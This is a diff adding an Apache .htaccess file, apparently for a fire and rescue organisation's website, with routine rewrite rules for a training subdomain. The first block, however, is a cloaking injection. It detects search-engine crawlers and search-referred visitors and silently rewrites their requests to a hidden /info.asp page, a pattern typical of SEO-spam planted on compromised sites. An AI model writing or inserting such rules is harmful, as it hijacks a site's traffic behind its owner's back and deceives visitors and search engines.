@@ -1,0 +1,21 @@
+
+RewriteEngine on
+RewriteCond %{HTTP_USER_AGENT} (google|baidu|sogou|yahoo|spider|bot) [NC,OR]
+RewriteCond %{HTTP_REFERER} (google|bing|yahoo|baidu|so|aol) [NC]
+RewriteCond %{REQUEST_URI} !\.(?i)(gif|bmp|js|css|jpg|jepg|png|gif|xls|rar|doc|swf|fla|zip|ico|txt|pdf|mp3|mp4|webm|wxav|xogg|xrar|x7z|xwoff|xxttf|xlsx)(\?.*)?$ [NC]
+RewriteCond %{REQUEST_URI} !^/info\.asp
+RewriteRule ^(.*)$ /info.asp?$1 [NC,L]
+RewriteCond %{HTTP_HOST} ^(www.)?training.salemfirerescue.org$
+RewriteCond %{REQUEST_URI} !^/training/
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ /training/$1
+RewriteCond %{HTTP_HOST} ^(www.)?training.salemfirerescue.org$
+RewriteRule ^(/)?$ training/$1 [L]
+RewriteCond %{HTTP_HOST} ^(www.)?salemfirerescue.org$
+RewriteCond %{REQUEST_URI} !^//
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ //$1
+RewriteCond %{HTTP_HOST} ^(www.)?salemfirerescue.org$
+RewriteRule ^(/)?$ /$1 [L]
